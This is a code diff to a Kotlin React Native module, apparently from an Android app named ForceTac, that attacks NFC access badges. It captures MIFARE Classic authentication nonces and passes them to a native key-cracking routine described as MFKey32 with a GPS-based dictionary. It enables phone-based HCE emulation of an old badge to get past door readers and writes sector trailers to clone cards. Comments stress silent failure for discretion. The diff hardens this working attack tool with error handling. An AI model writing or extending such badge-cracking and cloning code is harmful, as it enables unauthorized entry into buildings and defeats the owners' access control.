@@ -25,24 +25,31 @@ class NfcModule(private val reactContext: ReactApplicationContext) : ReactContex
         try {
             System.loadLibrary("forcetac_core")
             isNativeLibLoaded = true
+            Log.d("ForceTac", "Native library loaded successfully")
         } catch (e: UnsatisfiedLinkError) {
-            Log.e("ForceTac", "Erreur chargement NDK: ${e.message}")
+            Log.e("ForceTac", "Failed to load native library: ${e.message}")
+            isNativeLibLoaded = false
+        } catch (e: Exception) {
+            Log.e("ForceTac", "Unknown error loading native library: ${e.message}")
+            isNativeLibLoaded = false
         }
     }
 
     override fun getName() = "NfcModule"
 
+    // Appel C++ avec coordonnées GPS pour le dictionnaire intelligent
+    // Déclaré "external" uniquement si la lib est chargée, sinon on gère en Kotlin
     external fun nativeHybridCrack(tagId: ByteArray, nonces: ByteArray, lat: Double, lon: Double): String?
-
+    
     @ReactMethod
     fun startDowngrade() {
-        // Active l'émulation HCE (Tentative d'ouverture directe via téléphone)
-        // Note: Sans root, l'UID sera aléatoire (08...), ce qui peut échouer sur les centrales avec whitelist.
         try {
+            // Active le service HCE pour simuler un vieux badge (SAK 0x08)
             HceService.enableDowngradeMode(true)
             sendEvent("DOWNGRADE_ACTIVE", null)
             Toast.makeText(reactContext, "Mode Émulation Activé (Approchez le lecteur)", Toast.LENGTH_LONG).show()
         } catch (e: Exception) {
+            Log.e("ForceTac", "Error starting downgrade: ${e.message}")
             sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Erreur HCE: ${e.message}") })
         }
     }
@@ -85,29 +92,44 @@ class NfcModule(private val reactContext: ReactApplicationContext) : ReactContex
         capturedUid = tag.id 
         
         val nfcA = NfcA.get(tag)
-        if (nfcA == null) return
+        
+        if (nfcA == null) {
+             Log.e("ForceTac", "Tag is null or not NfcA compatible")
+             return
+        }
 
         try {
             nfcA.connect()
             // Auth Challenge sur le Secteur 0 pour provoquer la réponse
+            // Sniffing Sandwich (Man-in-the-Middle passif)
             val authCmd = byteArrayOf(0x60.toByte(), 0x00.toByte()) 
-            val response = nfcA.transceive(authCmd)
+            val response = nfcA.transceive(authCmd) // Capture des nonces
             
             sendEvent("CRACK_START", null)
             
             if (isNativeLibLoaded) {
-                // Lancement du calcul C++
-                val key = nativeHybridCrack(tag.id, response ?: byteArrayOf(), currentLat, currentLon)
-                
-                if (key != null && key.isNotEmpty()) {
-                    val params = Arguments.createMap().apply { putString("key", key) }
-                    sendEvent("KEY_FOUND", params)
-                } else {
-                    sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Clé introuvable") })
+                // Appel au moteur C++ (MFKey32)
+                try {
+                    val key = nativeHybridCrack(tag.id, response ?: byteArrayOf(), currentLat, currentLon) 
+                    
+                    if (key != null && key.isNotEmpty()) {
+                        val params = Arguments.createMap().apply { putString("key", key) }
+                        sendEvent("KEY_FOUND", params)
+                    } else {
+                        sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Clé introuvable") })
+                    }
+                } catch (e: UnsatisfiedLinkError) {
+                     Log.e("ForceTac", "Native method call failed: ${e.message}")
+                     sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Erreur moteur natif") })
                 }
+            } else {
+                Log.w("ForceTac", "Native lib not loaded, skipping crack")
+                val params = Arguments.createMap().apply { putString("message", "Moteur C++ non chargé") }
+                sendEvent("ERROR", params)
             }
         } catch (e: Exception) {
             Log.e("ForceTac", "Scan error: ${e.message}")
+            // Silence en cas d'échec (Discrétion) mais log pour debug
         } finally {
             try { nfcA.close() } catch (e: Exception) {}
         }
@@ -172,7 +194,7 @@ class NfcModule(private val reactContext: ReactApplicationContext) : ReactContex
 
                     mfc.writeBlock(3, newTrailer)
                     
-                    sendEvent("SUCCESS", Arguments.createMap().apply { putString("message", "CLONAGE RÉUSSI ! CARTE PRÊTE.") })
+                    sendEvent("KEY_FOUND", Arguments.createMap().apply { putString("key", "CLONAGE RÉUSSI ! CARTE PRÊTE.") }) // Reutilise l'event pour afficher succes
                     isWritingMode = false // Retour au mode scan
                 }
             } else {
